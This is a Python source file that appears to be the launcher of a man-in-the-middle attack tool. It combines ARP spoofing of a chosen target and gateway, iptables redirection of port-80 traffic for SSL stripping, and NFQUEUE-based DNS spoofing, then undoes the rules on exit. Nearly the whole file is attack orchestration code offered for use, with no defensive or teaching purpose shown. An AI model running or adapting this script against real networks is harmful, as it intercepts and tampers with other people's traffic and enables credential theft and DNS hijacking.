from arp import Arp
from dns_overkill import DnsOverkill
from dns import DnsStandard
from sslscript import Ssl

import os
import time
from scapy.all import *
from netfilterqueue import NetfilterQueue

import sys
import getopt

arpfile = Arp()
dnsoverkillfile = DnsOverkill()
dnsstandardfile = DnsStandard()
sslfile = Ssl()

sslstrip_enable = False
dnsstandard_enable = False
dnsoverkill_enable = False
target = ""
gateway = ""
me = ""
interface = ""

if __name__ == "__main__":
	try:
		opts, args = getopt.getopt(sys.argv, "t:g:m:i:sdo", ["target=", "gateway=", "me=", "interface=", "sslstrip", "dns", "dns-overkill"])
		for opt, arg in opts:
			if opt in ("-s", "--sslstrip"):
				sslstrip_enable = True
			elif opt in ("-d", "--dns"):
				dnsstandard_enable = True
			elif opt in ("-o", "--dns-overkill"):
				dnsoverkill_enable = True
			elif opt in ("-t", "--target"):
				target = str(arg)
			elif opt in ("-g", "--gateway"):
				gateway = str(arg)
			elif opt in ("-m", "--me"):
				me = str(arg)
			elif opt in ("-i", "--interface"):
				interface = str(arg)
	except getopt.GetoptError:
		print("wrong arguments supplied.")
		sys.exit(2)

	
	try:
		os.system("sudo iptables --flush")
		if sslstrip_enable:
			os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
			sslfile.ssl()
		os.system("sudo iptables -i {} -A FORWARD -j ACCEPT".format(interface))		
		arpfile.arp(target, gateway, interface)
		if dnsoverkill_enable:
			os.system("iptables -I FORWARD -j NFQUEUE --queue-num 1")
			dnsoverkillfile.dnsoverkill()
		if dnsstandard_enable and not dnsoverkill_enable:
			os.system("iptables -I FORWARD -j NFQUEUE --queue-num 1")
			dnsstandardfile.dnsstandard()

	except KeyboardInterrupt:
		#reverse every rule
		os.system("sudo iptables -i {} -D FORWARD -j ACCEPT".format(interface))
		if dnsstandard_enable or dnsoverkill_enable:
			os.system("sudo iptables -D FORWARD -j NFQUEUE --queue-num 1")
		if sslstrip_enable:
			os.system("sudo iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
		arpfile.arp_spoof(gateway, target, interface)
		arpfile.arp_spoof(target, gateway, interface)
		sys.exit(0)

